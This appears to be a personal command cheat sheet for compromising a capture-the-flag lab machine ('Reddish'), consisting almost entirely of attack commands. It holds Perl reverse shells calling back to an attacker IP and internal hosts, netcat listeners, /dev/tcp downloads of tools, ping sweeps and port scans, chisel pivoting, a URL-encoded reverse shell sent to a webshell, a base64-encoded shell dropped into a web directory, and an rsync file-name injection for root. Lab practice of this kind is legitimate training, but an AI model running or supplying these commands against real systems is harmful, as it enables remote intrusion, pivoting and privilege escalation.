
```bash
7de1d67778f7702daab47daa9ff58d1d

perl -e 'use Socket;$i="10.10.14.94";$p=8002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

rlwrap ncat -lvnp 800X

# file transfers
nc -lvnp $port <

bash -c "cat < /dev/tcp/10.10.14.94/6969 > /tmp/chisel"

# Meterpreter Practice
nohup ./met & 


# Network sweep
for i in $(seq 1 254); do (ping -c 1 172.$SUBNet.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
# Portscan
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done
# Port Redirection - Remote Pivot
# Kali
./chisel server -p 10000 -reverse -v  
# Reddish
nohup ./chisel client 10.10.14.94:10000 R:127.0.0.1:6379:172.19.0.2:6379 &
nohup ./chisel client 10.10.14.94:10000 R:127.0.0.1:10002:172.19.0.4:80 &
# Chisel - Local Pivot
nohup ./chisel client 10.10.14.94:10000 10003:127.0.0.1:10003 &


# Redis RCE to Webshell
./0xdfreddishRCE.sh

# www-data RCE 
perl -e 'use Socket;$i="172.19.0.3";$p=10003;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# We need to url encode the quotes!
curl http://127.0.0.1:10002/8924d0549008565c554f8128cd11fda4/nvm.php -d 'cmd=perl+-e+%27use+Socket%3b$i%3d%22172.19.0.3%22%3b$p%3d10003%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22>%26S%22)%3bopen(STDOUT,%22>%26S%22)%3bopen(STDERR,%22>%26S%22)%3bexec(%22/bin/bash+-i%22)%3b}%3b%27' --output -

# Rsync Root shell

# Add another Chisel - Local Pivot on NodeRed 
nohup ./chisel client 10.10.14.94:10000 10004:127.0.0.1:10004 &

vim # :set paste [ENTER] i [SHIFT CTRL + V]
perl -e 'use Socket;$i="172.19.0.3";$p=10004;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Encode to base64 to copy
cat rsync-rs | base64 -w0
# On Backup Docker container
#  Copy at peril in section - beware the shell 
echo 
# 
cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMyI7JHA9MTAwMDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTsnCg==
#
| base64 -d > /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb

# Abuse rsync gtfobins with
touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb

rlwrap ncat -lvnp 1000X


# File transfers for Post-Rsync
# Chisel Pivot for File Transfers initially and the a reverse shell - On NodeRed
nohup ./chisel client 10.10.14.94:10000 10005:127.0.0.1:10005 &

nc -lvnp 10005 < linpeas.sh

bash -c "cat < /dev/tcp/172.19.0.3/10005 > /tmp/linpeas.sh"
# Aaaaaaaaaaaaaawesome when this worked first

```
